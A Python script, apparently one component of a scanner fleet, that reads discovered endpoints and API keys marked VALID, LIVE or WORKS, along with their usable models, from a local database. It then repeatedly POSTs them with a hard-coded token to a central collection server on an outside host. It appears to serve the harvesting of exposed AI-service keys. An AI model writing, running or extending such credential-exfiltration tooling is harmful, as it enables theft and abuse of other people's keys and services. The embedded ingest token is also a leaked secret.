#!/usr/bin/env python3
"""Ship this node's findings to the central ingest endpoint.

Each Render node keeps its DB on an ephemeral disk: every redeploy wipes whatever
it found. This loop pushes new rows to the prod ingest server so the central table
(node_findings) accumulates results from the whole fleet.

Env: KH_INGEST_URL (default https://<prod>/find via Caddy), KH_INGEST_TOKEN, DB_PATH,
     NODE_NAME, SHIP_INTERVAL (sec, default 45), SHIP_STATUSES (csv).
Silent on success; prints one line per non-empty batch.
"""
import json
import os
import sqlite3
import time
import urllib.request

URL = os.environ.get('KH_INGEST_URL', 'https://git.reformboss.com/khfind/find').strip()
TOKEN = os.environ.get('KH_INGEST_TOKEN', 'd18b51939c94fc0c171c2d3076aa3290').strip()
DB = os.environ.get('DB_PATH', '/app/data/scanner.db')
NODE = os.environ.get('NODE_NAME') or os.environ.get('RENDER_SERVICE_NAME', 'node')
INTERVAL = int(os.environ.get('SHIP_INTERVAL', '45'))
STATUSES = [s.strip().upper() for s in os.environ.get(
    'SHIP_STATUSES', 'VALID,PAIR,PARTIAL,LIMIT,WORKS,LIVE').split(',') if s.strip()]

CURSOR = '/app/data/.ship_cursor'


def read_cursor():
    try:
        return int(open(CURSOR).read().strip())
    except Exception:
        return 0


def write_cursor(v):
    try:
        open(CURSOR, 'w').write(str(v))
    except Exception:
        pass


def fetch(since, limit=300):
    con = sqlite3.connect(DB, timeout=20)
    q = ('select id,endpoint,key,status,chat_ok,models_json,key_kind from findings '
         'where id>? and upper(status) in (%s) order by id limit ?' % ','.join('?' * len(STATUSES)))
    rows = con.execute(q, [since] + STATUSES + [limit]).fetchall()
    con.close()
    out = []
    for rid, ep, key, st, chat_ok, models_json, kind in rows:
        try:
            models = json.loads(models_json or '[]')
        except Exception:
            models = []
        out.append({'node': NODE, 'endpoint': ep, 'key': key, 'status': st,
                    'provider': kind or '', 'models': models[:8], 'chat_ok': chat_ok})
    return out, (rows[-1][0] if rows else since)


def ship(rows):
    body = json.dumps(rows).encode()
    req = urllib.request.Request(URL, data=body, method='POST',
                                 headers={'Content-Type': 'application/json',
                                          'X-Token': TOKEN})
    with urllib.request.urlopen(req, timeout=45) as r:
        return json.loads(r.read() or b'{}')


def main():
    if not URL:
        return
    since = read_cursor()
    while True:
        try:
            rows, last = fetch(since)
            if rows:
                res = ship(rows)
                since = last
                write_cursor(since)
                print('[ship] node=%s sent=%d added=%s total=%s'
                      % (NODE, len(rows), res.get('added'), res.get('total')), flush=True)
        except Exception as e:
            print('[ship] err %s: %s' % (type(e).__name__, str(e)[:120]), flush=True)
        time.sleep(INTERVAL)


if __name__ == '__main__':
    main()